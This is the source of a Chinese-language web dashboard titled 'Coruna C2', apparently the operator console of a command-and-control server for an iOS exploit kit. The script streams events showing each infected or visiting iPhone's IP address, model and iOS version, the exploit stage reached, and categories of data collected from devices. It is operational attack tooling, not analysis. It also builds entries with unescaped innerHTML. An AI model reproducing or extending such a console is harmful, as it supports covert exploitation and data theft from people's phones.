<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Coruna C2 - 实时监视器</title>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace; background: #0a0e17; color: #d4d4d4; height: 100vh; display: flex; flex-direction: column; }
header { background: #111827; padding: 12px 24px; border-bottom: 1px solid #1f2937; display: flex; align-items: center; gap: 16px; flex-shrink: 0; }
header h1 { font-size: 18px; color: #e5e7eb; }
header .badge { background: #059669; color: #fff; font-size: 12px; padding: 2px 10px; border-radius: 10px; }
header .status { margin-left: auto; font-size: 13px; color: #6b7280; }
header .status .dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; margin-right: 6px; }
header .status .dot.on { background: #22c55e; }
header .status .dot.off { background: #ef4444; }
.stats { display: flex; gap: 16px; padding: 12px 24px; background: #0f172a; border-bottom: 1px solid #1f2937; flex-shrink: 0; }
.stat { font-size: 13px; }
.stat label { color: #6b7280; }
.stat span { color: #e5e7eb; font-weight: 600; margin-left: 4px; }
.feed { flex: 1; overflow-y: auto; padding: 8px 0; }
.feed::-webkit-scrollbar { width: 6px; }
.feed::-webkit-scrollbar-track { background: transparent; }
.feed::-webkit-scrollbar-thumb { background: #374151; border-radius: 3px; }
.entry { padding: 10px 24px; border-bottom: 1px solid #1a2332; display: flex; gap: 12px; align-items: flex-start; animation: slideIn 0.3s ease; }
.entry:hover { background: #111f2e; }
@keyframes slideIn { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
.entry .time { color: #6b7280; font-size: 12px; min-width: 70px; padding-top: 2px; }
.entry .icon { font-size: 16px; min-width: 24px; text-align: center; }
.entry .body { flex: 1; min-width: 0; }
.entry .body .title { font-size: 14px; color: #e5e7eb; }
.entry .body .detail { font-size: 12px; color: #9ca3af; margin-top: 2px; word-break: break-all; }
.entry .body .detail .tag { display: inline-block; background: #1f2937; padding: 0 6px; border-radius: 3px; margin-right: 4px; font-size: 11px; }
.entry.device .icon { color: #22c55e; }
.entry.exploit .icon { color: #f59e0b; }
.entry.collect .icon { color: #3b82f6; }
.entry.error .icon { color: #ef4444; }
.empty { text-align: center; padding: 60px 20px; color: #4b5563; font-size: 14px; }
.controls { padding: 8px 24px; border-top: 1px solid #1f2937; display: flex; gap: 8px; flex-shrink: 0; background: #0f172a; }
.controls button { background: #1f2937; border: none; color: #d4d4d4; padding: 6px 14px; border-radius: 6px; font-size: 13px; cursor: pointer; }
.controls button:hover { background: #374151; }
.controls button.danger { color: #ef4444; }
.controls .count { margin-left: auto; font-size: 13px; color: #6b7280; }
</style>
</head>
<body>

<header>
  <h1>Coruna C2 实时监视器</h1>
  <span class="badge">LIVE</span>
  <div class="status"><span class="dot off" id="connDot"></span><span id="connStatus">未连接</span></div>
</header>

<div class="stats">
  <div class="stat"><label>访问总数</label><span id="totalCount">0</span></div>
  <div class="stat"><label>今日</label><span id="todayCount">0</span></div>
  <div class="stat"><label>设备数</label><span id="deviceCount">0</span></div>
  <div class="stat"><label>数据收集</label><span id="collectCount">0</span></div>
</div>

<div class="feed" id="feed">
  <div class="empty">等待设备接入...</div>
</div>

<div class="controls">
  <button onclick="clearFeed()">清空</button>
  <button class="danger" onclick="togglePause()" id="pauseBtn">暂停</button>
  <span class="count" id="entryCount">0 条</span>
</div>

<script>
const feed = document.getElementById('feed');
const connDot = document.getElementById('connDot');
const connStatus = document.getElementById('connStatus');
const totalCount = document.getElementById('totalCount');
const todayCount = document.getElementById('todayCount');
const deviceCount = document.getElementById('deviceCount');
const collectCount = document.getElementById('collectCount');
const entryCount = document.getElementById('entryCount');
const pauseBtn = document.getElementById('pauseBtn');

let paused = false;
let entries = 0;
let stats = { total: 0, today: 0, devices: new Set(), collects: 0 };
let retryDelay = 1000;

function addEntry(type, title, detail) {
  entries++;
  stats.total++;
  stats.today++;
  if (type === 'device') stats.devices.add(detail.match(/[a-f0-9]{8,}/)?.[0] || title);
  if (type === 'collect') stats.collects++;

  const empty = feed.querySelector('.empty');
  if (empty) empty.remove();

  const div = document.createElement('div');
  div.className = 'entry ' + type;
  const time = new Date().toLocaleTimeString();
  const icons = { device: '📱', exploit: '⚡', collect: '📦', proxy: '🔄', error: '⚠️' };
  div.innerHTML = `
    <span class="time">${time}</span>
    <span class="icon">${icons[type] || '📌'}</span>
    <div class="body">
      <div class="title">${title}</div>
      <div class="detail">${detail}</div>
    </div>
  `;
  feed.insertBefore(div, feed.firstChild);

  while (feed.children.length > 200) feed.lastChild.remove();

  updateStats();
  if (!paused) playSound();
}

function playSound() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.value = 880;
    gain.gain.value = 0.05;
    osc.start();
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.15);
    osc.stop(ctx.currentTime + 0.15);
  } catch(e) {}
}

function updateStats() {
  totalCount.textContent = stats.total;
  todayCount.textContent = stats.today;
  deviceCount.textContent = stats.devices.size;
  collectCount.textContent = stats.collects;
  entryCount.textContent = entries + ' 条';
}

function clearFeed() {
  feed.innerHTML = '<div class="empty">已清空，等待新事件...</div>';
  entries = 0;
  entryCount.textContent = '0 条';
}

function togglePause() {
  paused = !paused;
  pauseBtn.textContent = paused ? '继续' : '暂停';
  pauseBtn.style.color = paused ? '#22c55e' : '#ef4444';
}

function connect() {
  const evtSource = new EventSource('/api/events');

  evtSource.addEventListener('open', () => {
    connDot.className = 'dot on';
    connStatus.textContent = '已连接';
    retryDelay = 1000;
  });

  evtSource.addEventListener('access', (e) => {
    const data = JSON.parse(e.data);
    const ua = (data.user_agent || '');
    const model = ua.match(/iPhone(\d+,\d+)?|iPad(\d+,\d+)?/)?.[0] || 'iPhone';
    const ver = ua.match(/OS (\d+[_\d]*)/)?.[1]?.replace(/_/g, '.') || '?';
    addEntry('device', `设备接入`, `${data.ip} | ${model} iOS ${ver} | ${ua.substring(0, 80)}`);
  });

  evtSource.addEventListener('collect', (e) => {
    const data = JSON.parse(e.data);
    addEntry('collect', `数据收集`, `设备: ${data.device_uuid?.substring(0, 16)} 分类: ${data.category} 来源: ${data.source}`);
  });

  evtSource.addEventListener('report', (e) => {
    const data = JSON.parse(e.data);
    addEntry('device', `漏洞上报`, `设备: ${data.device_uuid?.substring(0, 16)} | ${data.device_model || ''} ${data.ios_version || ''} 阶段: ${data.exploit_stage || 'none'}`);
  });

  evtSource.addEventListener('proxy', (e) => {
    const data = JSON.parse(e.data);
    const path = data.url?.substring(data.url.lastIndexOf('/') + 1) || data.url;
    addEntry('exploit', `第三方捕获`, `${data.ip} | ${data.method} ${path} | ${(data.user_agent || '').substring(0, 60)}`);
  });

  evtSource.addEventListener('error', (e) => {
    if (e.eventPhase === EventSource.CLOSED) {
      connDot.className = 'dot off';
      connStatus.textContent = '已断开，重试中...';
      setTimeout(connect, Math.min(retryDelay, 30000));
      retryDelay *= 2;
    }
  });
}

// Load today's stats on startup
fetch('/api/admin/logs?limit=200').then(r => r.json()).then(data => {
  if (data && data.logs) {
    stats.total = data.total || data.logs.length;
    const today = new Date().toDateString();
    stats.today = data.logs.filter(l => new Date(l.timestamp).toDateString() === today).length;
    updateStats();
  }
}).catch(() => {});
fetch('/api/collect/categories').then(r => r.json()).then(data => {
  if (data && data.categories) {
    stats.collects = Object.values(data.categories).reduce((a, b) => a + b, 0);
    updateStats();
  }
}).catch(() => {});

connect();
</script>
</body>
</html>
